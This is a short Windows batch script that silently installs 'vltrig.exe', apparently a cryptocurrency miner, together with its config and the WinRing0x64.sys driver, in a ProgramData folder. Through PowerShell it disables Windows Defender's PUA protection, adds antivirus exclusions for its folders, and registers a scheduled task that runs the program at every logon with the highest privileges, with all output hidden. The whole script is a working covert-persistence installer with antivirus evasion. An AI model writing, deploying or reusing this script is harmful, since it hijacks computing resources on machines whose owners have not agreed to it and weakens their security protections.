@echo off
set DEST=C:\ProgramData\VLTrig
set SRC=%~dp0

if not exist "%DEST%" mkdir "%DEST%"

powershell -ExecutionPolicy Bypass -Command "Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%DEST%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%SRC%' -ErrorAction SilentlyContinue" >nul 2>&1

copy /y "%SRC%vltrig.exe" "%DEST%\" >nul
copy /y "%SRC%config.json" "%DEST%\" >nul
copy /y "%SRC%WinRing0x64.sys" "%DEST%\" >nul

schtasks /delete /tn "VLTrig" /f >nul 2>&1
schtasks /create /tn "VLTrig" /tr "\"%DEST%\vltrig.exe\" --config=\"%DEST%\config.json\"" /sc onlogon /rl highest /f >nul
schtasks /run /tn "VLTrig" >nul
